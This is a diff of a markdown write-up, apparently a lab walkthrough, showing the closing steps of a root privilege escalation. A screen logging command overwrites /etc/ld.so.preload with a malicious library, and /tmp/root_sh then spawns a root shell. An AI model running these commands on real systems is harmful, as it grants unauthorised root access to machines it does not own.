@@ -190,8 +190,11 @@ void libshell(void)
 + **What we need to do now is to overwrite the /etc/ld.so.preload file with our shared library** *shell_library.so* **which executes the shell with root privilege. Let's first move into the /etc directory**
 
 ``cd /etc``
+
 ``screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/lib_shell.so"``
+
 ``screen -ls``
+
 ``/tmp/root_sh``
 
 **And we are root!**
